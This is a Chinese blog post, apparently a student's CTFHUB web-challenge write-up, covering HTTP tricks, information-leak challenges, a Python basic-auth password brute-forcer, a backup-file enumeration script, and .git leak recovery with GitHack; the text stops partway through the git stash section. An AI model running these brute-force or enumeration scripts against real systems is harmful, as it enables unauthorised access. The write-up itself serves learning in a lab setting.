

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://sina.wuuconix.link/large/007YVyKcly1h1w9ogawmvj30jg0jgtdg.jpg">
  <link rel="icon" href="https://sina.wuuconix.link/large/007YVyKcly1h1w9ogawmvj30jg0jgtdg.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="wuuconix">
  <meta name="keywords" content="">
  
    <meta name="description" content="背景 本部的阮行止学长推荐了ctf web方向的刷题顺序。这几天太废了，光顾着看JOJO了2333，已经从大乔看到了星辰远征军埃及篇了，今天打算学习学习，不让自己的良心太难受。  Web前置技能  HTTP协议——请求方式 这道题很有意思。 题目提示说，只有用CTFHUB这个方法请求，才能获得flag。一般的请求方式有GET和POST等，那如何用这个自定义的CTFHUB来请求呢？我">
<meta property="og:type" content="article">
<meta property="og:title" content="CTFHUB刷题笔记">
<meta property="og:url" content="https://wuuconix.link/2021/08/18/ctfhub/index.html">
<meta property="og:site_name" content="wuuconix&#39;s blog">
<meta property="og:description" content="背景 本部的阮行止学长推荐了ctf web方向的刷题顺序。这几天太废了，光顾着看JOJO了2333，已经从大乔看到了星辰远征军埃及篇了，今天打算学习学习，不让自己的良心太难受。  Web前置技能  HTTP协议——请求方式 这道题很有意思。 题目提示说，只有用CTFHUB这个方法请求，才能获得flag。一般的请求方式有GET和POST等，那如何用这个自定义的CTFHUB来请求呢？我">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://sina.wuuconix.link/large/007YVyKcly1h3o0zw94roj319n0kcgpg.jpg">
<meta property="article:published_time" content="2021-08-18T11:23:09.000Z">
<meta property="article:modified_time" content="2021-10-18T11:23:09.000Z">
<meta property="article:author" content="wuuconix">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="writeup">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://sina.wuuconix.link/large/007YVyKcly1h3o0zw94roj319n0kcgpg.jpg">
  
  
  
  <title>CTFHUB刷题笔记 - wuuconix&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/toubudaziji.css">
<link rel="stylesheet" href="/css/gundongtiao.css">
<link rel="stylesheet" href="/css/APlayer.min.css">
<link rel="stylesheet" href="/css/scrollbar.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_3317131_6niuojsefqt.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"wuuconix.link","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"Tpnm8c3kMWvXEXe6TN9JQnvb-gzGzoHsz","app_key":"1I9i7nfFTc4ulrrtGwfite4s","server_url":"https://tpnm8c3k.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="wuuconix's blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>wuuconix</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://sina.wuuconix.link/large/007YVyKcly1h3o103nanfj31hc0u0k0m.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CTFHUB刷题笔记"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2021-08-18 11:23" pubdate>
          2021年8月18日 上午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          66k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          550 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">CTFHUB刷题笔记</h1>
            
              <p class="note note-info">
                
                  
                    本文最后更新于：2021年10月18日 上午
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <header><meta name="referrer" content="never"></header>

    <div id="aplayer-dVoCrtgz" class="aplayer aplayer-tag-marker meting-tag-marker"
         data-id="28442575" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"
    ></div>
<h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2>
<p>本部的阮行止学长推荐了ctf web方向的刷题顺序。这几天太废了，光顾着看JOJO了2333，已经从大乔看到了星辰远征军埃及篇了，今天打算学习学习，不让自己的良心太难受。</p>
<h2 id="web前置技能"><a class="markdownIt-Anchor" href="#web前置技能"></a> Web前置技能</h2>
<h3 id="http协议请求方式"><a class="markdownIt-Anchor" href="#http协议请求方式"></a> HTTP协议——请求方式</h3>
<p>这道题很有意思。</p>
<p>题目提示说，只有用CTFHUB这个方法请求，才能获得flag。一般的请求方式有GET和POST等，那如何用这个自定义的CTFHUB来请求呢？我想到了HTTP报文中一般会把方法写在开头，比如以下报文就是GET方式请求的。</p>
<p><img src="https://upyun.wuuconix.link/image-20210818191504901.png" srcset="/img/loading.gif" lazyload alt="GET请求" /></p>
<p>我在Burpsuite把GET改成CTFHUB后重新发送请求，就获得了flag。</p>
<p>那这是怎么实现的呢？我猜测大概率是利用PHP中的全局变量<code>$_SERVER['REQUEST_METHOD']</code>来判断请求方法是什么的。</p>
<p><img src="https://upyun.wuuconix.link/image-20210818191818501.png" srcset="/img/loading.gif" lazyload alt="WUUCONIX请求" /></p>
<h3 id="http协议302跳转"><a class="markdownIt-Anchor" href="#http协议302跳转"></a> HTTP协议——302跳转</h3>
<p>页面有一个按钮，点击后会到达index.php，但是它返回的状态码是302，我们无法看到内容就被重定向到了原本的index.html。</p>
<p><img src="https://upyun.wuuconix.link/image-20210819182002895.png" srcset="/img/loading.gif" lazyload alt="题目主界面" /></p>
<p>用burpsuite很容易看到302界面的flag。</p>
<p><img src="https://upyun.wuuconix.link/image-20210819182054109.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<p>那php是如何实现这种302界面并且实现跳转的呢？搜索一番资料后我发现这种实现非常简单和优美。</p>
<p><img src="https://upyun.wuuconix.link/image-20210819182632028.png" srcset="/img/loading.gif" lazyload alt="header函数" /></p>
<p>我们利用这个神奇的header函数就能够发送原生的http头从而实现跳转。</p>
<p>效果如下。</p>
<p><img src="https://upyun.wuuconix.link/image-20210819182801832.png" srcset="/img/loading.gif" lazyload alt="302的实现" /></p>
<h3 id="http协议cookie"><a class="markdownIt-Anchor" href="#http协议cookie"></a> HTTP协议——Cookie</h3>
<p>界面提示只有admin才能获得flag，结合题目cookie，思路很明显。利用burpsuite抓包后发现cookie有admin属性，设置为1之后就能获得flag。</p>
<p><img src="https://upyun.wuuconix.link/image-20210819183209032.png" srcset="/img/loading.gif" lazyload alt="cookie-flag" /></p>
<p>实现也非常简单，用php里的setcookie函数就能够在cookie中设置一个属性，并赋予其默认值。</p>
<p><img src="https://upyun.wuuconix.link/image-20210819183958184.png" srcset="/img/loading.gif" lazyload alt="setcookie" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210819184015543.png" srcset="/img/loading.gif" lazyload alt="cookie判断实现" /></p>
<h3 id="http协议基础认证"><a class="markdownIt-Anchor" href="#http协议基础认证"></a> HTTP协议——基础认证</h3>
<p>这道题需要用到编写脚本了！果然最近荒废了许多，花了20几分钟才做出这道基础题，险些超时。这道题让我了解了一种http原生的基础认证，状态码是401，需要让用户进行输入用户名和密码进行验证。</p>
<p>抓包后发现<code>WWW-Authenticate</code>字段中有提示。</p>
<p><img src="https://upyun.wuuconix.link/image-20210819191510686.png" srcset="/img/loading.gif" lazyload alt="WWW-Authenticate" /></p>
<p>很显然用户名就是admin了。那密码是什么呢？该题目提供了一个附件，里面有100个密码，那么密码也知道了。</p>
<p>根据基础认证的流程，用户名和密码经过拼接，再经过base64加密后放在Authentication属性中发送到服务器，服务器对其进行验证。</p>
<p><img src="https://upyun.wuuconix.link/image-20210819191713024.png" srcset="/img/loading.gif" lazyload alt="验证流程" /></p>
<p>但是有100个密码，一个个试太麻烦了，遂用python实现。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br>burp0_url = <span class="hljs-string">&quot;http://challenge-76a7f08ebaef75b3.sandbox.ctfhub.com:10800/flag.html&quot;</span><br>num = <span class="hljs-number">0</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;10_million_password_list_top_100.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>        num = num + <span class="hljs-number">1</span><br>        password = line[:-<span class="hljs-number">1</span>]    <span class="hljs-comment">#去掉每行最后的换行符</span><br>        Authorization = <span class="hljs-string">&quot;Basic &quot;</span> + base64.b64encode((<span class="hljs-string">&quot;admin:&quot;</span> + password).encode()).decode()<br>        burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;Authorization&quot;</span>: Authorization&#125;<br>        response = requests.get(burp0_url, headers=burp0_headers).text<br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;ctfhub&quot;</span> <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&quot;</span>, num, <span class="hljs-string">&quot;个密码正确，发现flag&quot;</span>)<br>            <span class="hljs-built_in">print</span>(response)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&quot;</span>, num, <span class="hljs-string">&quot;个密码错误，没有找到flag&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>代码主题的request部分有burpsuite的插件<code>Copy as Requests</code>自动生成，然后自己设置了一个变量Authentication，遍历所有的密码。</p>
<p><img src="https://upyun.wuuconix.link/image-20210819191927327.png" srcset="/img/loading.gif" lazyload alt="脚本跑flag" /></p>
<p>最终在第84个密码获得了flag。</p>
<p>这次python脚本编写经历，我发现判断一个字符串中是否含有某个字符实际上非常简单，用in谓词即可。</p>
<p>这道题看了官方writeup，发现burpsuite的Intruder完全可以代替写脚本，只需要导入密码，然后添加前缀<code>admin:</code>，再最进行base64加密，就可以实现对遍历。</p>
<p><img src="https://upyun.wuuconix.link/image-20210819194127879.png" srcset="/img/loading.gif" lazyload alt="burpsuite intruder" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210819194159435.png" srcset="/img/loading.gif" lazyload alt="得到正确密码" /></p>
<p>最后老样子，来自己实现一下http的基础认证。</p>
<p><img src="https://upyun.wuuconix.link/image-20210819192842196.png" srcset="/img/loading.gif" lazyload alt="实现http基础认证" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210819193142666.png" srcset="/img/loading.gif" lazyload alt="登录框" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210819193237861.png" srcset="/img/loading.gif" lazyload alt="登录成功" /></p>
<p>还是很有可玩性的，以后可以试试。</p>
<h3 id="http协议相应包源代码"><a class="markdownIt-Anchor" href="#http协议相应包源代码"></a> HTTP协议——相应包源代码</h3>
<p>F12看到flag，蚌埠住了</p>
<p><img src="https://upyun.wuuconix.link/image-20210820121753297.png" srcset="/img/loading.gif" lazyload alt="贪吃蛇F12" /></p>
<h2 id="信息泄露"><a class="markdownIt-Anchor" href="#信息泄露"></a> 信息泄露</h2>
<h3 id="目录遍历"><a class="markdownIt-Anchor" href="#目录遍历"></a> 目录遍历</h3>
<p><img src="https://upyun.wuuconix.link/image-20210820122234335.png" srcset="/img/loading.gif" lazyload alt="目录" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210820122304068.png" srcset="/img/loading.gif" lazyload alt="flag.txt" /></p>
<p>再<code>/3/1/</code>下找到flag。</p>
<p>这种apache的文件浏览是怎么做到的呢？</p>
<p>实际上在某个目录下新建一个.htaccess文件，然后写入以下内容，那么该文件夹里的内容都会被列举出来啦。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">Files</span> *&gt;</span> Options Indexes <span class="hljs-tag">&lt;/<span class="hljs-name">Files</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210820125904991.png" srcset="/img/loading.gif" lazyload alt="indexes" /></p>
<p>值得注意的是，html文件点就后会被直接渲染出来，十分有用。以下是<code>test.html</code>的内容和渲染结果。</p>
<p><img src="https://upyun.wuuconix.link/image-20210820130102239.png" srcset="/img/loading.gif" lazyload alt="test.html" /></p>
<img src="https://upyun.wuuconix.link/image-20210820130022575.png" srcset="/img/loading.gif" lazyload alt="看板娘" style="zoom: 80%;" />
<h3 id="phpinfo"><a class="markdownIt-Anchor" href="#phpinfo"></a> PHPINFO</h3>
<p>这道题太棒了，flag直接藏在phpinfo里面。界面搜索<code>ctfhub</code>不一会儿就在<code>$_ENV['FLAG']</code>里找到了flag。</p>
<p><img src="https://upyun.wuuconix.link/image-20210820130453899.png" srcset="/img/loading.gif" lazyload alt="phpinfo里的flag" /></p>
<p>老习惯，自己也来试试吧吧！</p>
<p><img src="https://upyun.wuuconix.link/image-20210820132350381.png" srcset="/img/loading.gif" lazyload alt="$_ENV" /></p>
<p>比想象的简单，我用的是<code>php:5.6-apache</code>镜像，只要在docker run 的时候加入环境变量即可在phpinfo中展现出来。所以如果在ctf比赛中出题人在出题时用动态flag，这必将利用到环境变量，如果出题人忘记删除掉环境变量，同时我们能够访问到phpinfo的话，就可以直接得到flag，虽然一般都会把环境变量删掉2333。</p>
<p>以下是docker run语句。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -itd --name php -v <span class="hljs-string">&quot;/root/tools/html:/var/www/html&quot;</span> -p 10000:80 -e FLAG=flag&#123;wuuconix_yyds!&#125; php:5.6-apache<br></code></pre></td></tr></table></figure>
<h3 id="备份文件下载网站源码"><a class="markdownIt-Anchor" href="#备份文件下载网站源码"></a> 备份文件下载——网站源码</h3>
<p><img src="https://upyun.wuuconix.link/image-20210823124045706.png" srcset="/img/loading.gif" lazyload alt="提示" /></p>
<p>提示很明显了，故用脚本来判断备份文件到底是什么，利用返回的statau_code是不是404，来判断。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>head_list = [<span class="hljs-string">&#x27;web&#x27;</span>, <span class="hljs-string">&#x27;website&#x27;</span>, <span class="hljs-string">&#x27;backup&#x27;</span>, <span class="hljs-string">&#x27;back&#x27;</span>, <span class="hljs-string">&#x27;www&#x27;</span>, <span class="hljs-string">&#x27;wwwroot&#x27;</span>, <span class="hljs-string">&#x27;temp&#x27;</span>]<br>ext_list = [<span class="hljs-string">&#x27;tar&#x27;</span>, <span class="hljs-string">&#x27;tar.gz&#x27;</span>, <span class="hljs-string">&#x27;zip&#x27;</span>, <span class="hljs-string">&#x27;rar&#x27;</span>]<br><span class="hljs-keyword">for</span> head <span class="hljs-keyword">in</span> head_list:<br>    <span class="hljs-keyword">for</span> ext <span class="hljs-keyword">in</span> ext_list:<br>        url = <span class="hljs-string">&quot;http://challenge-a2c8887aa9929362.sandbox.ctfhub.com:10800/&quot;</span><br>        file = head + <span class="hljs-string">&quot;.&quot;</span> + ext<br>        url += file<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;尝试url：&quot;</span>, url)<br>        res = requests.get(url)<br>        <span class="hljs-keyword">if</span> (res.status_code != <span class="hljs-number">404</span>):<br>            <span class="hljs-built_in">print</span>(res.text)  <br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;返回404&quot;</span>)<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210821224917425.png" srcset="/img/loading.gif" lazyload alt="www.zip" /></p>
<p>锁定www.zip，访问网站后会自动下载该压缩包，得到一个文件。</p>
<p><img src="https://upyun.wuuconix.link/image-20210821225005651.png" srcset="/img/loading.gif" lazyload alt="flag_111253415.txt" /></p>
<p>打开后没有flag。</p>
<p><img src="https://upyun.wuuconix.link/image-20210821225044525.png" srcset="/img/loading.gif" lazyload alt="where is flag ??" /></p>
<p>在网页中访问该文件得到flag。</p>
<p><img src="https://upyun.wuuconix.link/image-20210821225129233.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<h3 id="备份文件下载bak文件"><a class="markdownIt-Anchor" href="#备份文件下载bak文件"></a> 备份文件下载——bak文件</h3>
<p><img src="https://upyun.wuuconix.link/image-20210821225548834.png" srcset="/img/loading.gif" lazyload alt="hint" /></p>
<p>提示flag就在index.php里，index.php会在某些情况下产生出一些备份文件。我对此进行了罗列。</p>
<p><img src="https://upyun.wuuconix.link/image-20210821230626015.png" srcset="/img/loading.gif" lazyload alt="php备份文件后缀罗列" /></p>
<p>然后利用dirsearch指定这个字典文件，扫描后扫到了<code>index.php.bak</code>，就是题目2333</p>
<p><img src="https://upyun.wuuconix.link/image-20210821225756406.png" srcset="/img/loading.gif" lazyload alt="dirsearch -w 指定字典文件" /></p>
<p>访问下载打开后得到flag。</p>
<p><img src="https://upyun.wuuconix.link/image-20210821225816354.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<h3 id="备份文件下载vim缓存"><a class="markdownIt-Anchor" href="#备份文件下载vim缓存"></a> 备份文件下载——vim缓存</h3>
<p>和上题一样，继续使用dirsearch和我罗列的字典。发现<code>.index.php.swp</code>。这种文件是因为在使用vim编辑过程意外退出产生的，如果继续套娃意外退出，还可能会产生<code>.index.php.swo</code>和<code>.index.php.swn</code>。</p>
<p><img src="https://upyun.wuuconix.link/image-20210821230953733.png" srcset="/img/loading.gif" lazyload alt="dirsearch扫描" /></p>
<p>下载后发现这不是普通的文本文件。vscode打不开。</p>
<p><img src="https://upyun.wuuconix.link/image-20210821231035885.png" srcset="/img/loading.gif" lazyload alt="vscode无法打开" /></p>
<p>在ubuntu里用curl -o下载文件，再用vim -r即可。</p>
<p><img src="https://upyun.wuuconix.link/image-20210821231134659.png" srcset="/img/loading.gif" lazyload alt="curl -o下载文件" /></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">vim -r <span class="hljs-selector-class">.index</span><span class="hljs-selector-class">.php</span>.swp<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210821231204982.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<p>这个vim还挺有趣的，我试了一翻，一开始意外退出是<code>swp</code>然后再次意外退出是<code>swo</code>，这个顺序其实是字母表从后往前推进了。注意下图的时间。不知道到了swa之后会不会是swz呀2333。</p>
<p><img src="https://upyun.wuuconix.link/image-20210821232126236.png" srcset="/img/loading.gif" lazyload alt="套娃&quot;意外退出&quot;" /></p>
<h3 id="备份文件下载ds_store"><a class="markdownIt-Anchor" href="#备份文件下载ds_store"></a> 备份文件下载——.DS_Store</h3>
<p><img src="https://upyun.wuuconix.link/image-20210822220155355.png" srcset="/img/loading.gif" lazyload alt=".DS_Store" /></p>
<p>看来这个<code>.DS_Store</code>是尊贵的Mac OS专享文件。</p>
<p>在ubuntu里curl -o下载文件，发现flag位置。</p>
<p><img src="https://upyun.wuuconix.link/image-20210822220726311.png" srcset="/img/loading.gif" lazyload alt=".DS_Store" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210822220752194.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<p>访问后得到flag。</p>
<p>我发现直接cat 这个文件有些乱码，看了官方的writeup后了解到可以用<a target="_blank" rel="noopener" href="https://github.com/gehaxelt/Python-dsstore">gehaxelt/Python-dsstore</a>来看到原本的内容。</p>
<p>使用之后成功得到原始数据。</p>
<p><img src="https://upyun.wuuconix.link/image-20210822222446935.png" srcset="/img/loading.gif" lazyload alt="dsstore" /></p>
<p>我在我的ubuntu主机上也找了一下<code>.DS_Store</code>。发现一些博客插件里也有.DS_Store 2333，估计它们用的都是尊贵的Mac OS进行开发的，羡慕啊。</p>
<p><img src="https://upyun.wuuconix.link/image-20210822220934431.png" srcset="/img/loading.gif" lazyload alt="博客插件里的.DS_Store" /></p>
<h3 id="git泄露log"><a class="markdownIt-Anchor" href="#git泄露log"></a> Git泄露——Log</h3>
<p><img src="https://upyun.wuuconix.link/image-20210822224820931.png" srcset="/img/loading.gif" lazyload alt="题干" /></p>
<p>这道题太妙了，题干中提示了.git泄露，同时提到了一款强大的工具<a target="_blank" rel="noopener" href="https://github.com/BugScanTeam/GitHack">BugScanTeam/GitHack: .git 泄漏利用工具，可还原历史版本 (github.com)</a></p>
<p><img src="https://upyun.wuuconix.link/image-20210822224948271.png" srcset="/img/loading.gif" lazyload alt="GitHack运行截图" /></p>
<p>利用这个GitHack工具可以下载到当前的网页源文件和<code>.git文件夹</code></p>
<p><img src="https://upyun.wuuconix.link/image-20210822225128772.png" srcset="/img/loading.gif" lazyload alt="得到了源文件" /></p>
<p>但是不幸的是，<code>index.html</code>中没有flag。</p>
<p><img src="https://upyun.wuuconix.link/image-20210822225225938.png" srcset="/img/loading.gif" lazyload alt="index.html" /></p>
<p>我又用vscode的搜索功能在整个文件夹下找<code>ctfhub</code>，结果也没有发现flag。</p>
<p><img src="https://upyun.wuuconix.link/image-20210822225332107.png" srcset="/img/loading.gif" lazyload alt="vscode 搜索" /></p>
<p>我陷入了人生和社会的大思考。</p>
<p>但是我注意到了一个重要信息，这里曾经是有flag的，只不过在某次commit中删除了。</p>
<p><img src="https://upyun.wuuconix.link/image-20210822225438519.png" srcset="/img/loading.gif" lazyload alt="remove flag" /></p>
<p>想了一会儿，我突然意识到git这种东西应该是能恢复到之前的某个状态的，因为自己一直没有使用这个功能，也不适用分支这种，便忽略了这个强大的功能。</p>
<p>利用<code>git log</code>便能看到所有的变化。</p>
<p><img src="https://upyun.wuuconix.link/image-20210822225638898.png" srcset="/img/loading.gif" lazyload alt="git log" /></p>
<p>然后我们利用<code>git reset --hard commit id</code>来恢复到某个状态，我们这里就选择刚刚添加flag那个commit。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">git <span class="hljs-keyword">reset</span> <span class="hljs-comment">--hard 065ab364a11a0c75abc11340cb882b277827ed02</span><br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210822225840842.png" srcset="/img/loading.gif" lazyload alt="git reset --hard" /></p>
<p>然后就会发现文件夹下多了个文本文件，里面就是flag啦。</p>
<p><img src="https://upyun.wuuconix.link/image-20210822225937737.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<p>git这种能够回到过去的强大能力让我惊讶，今后也好多多利用好git这个优秀的工具。</p>
<h3 id="git泄露stash"><a class="markdownIt-Anchor" href="#git泄露stash"></a> Git泄露——Stash</h3>
<p>查阅了一下资源，git stash是一种将本地项目的状态存储起来的操作，不会上传到github上。</p>
<p>继续用GitHack恢复<code>.git</code>目录</p>
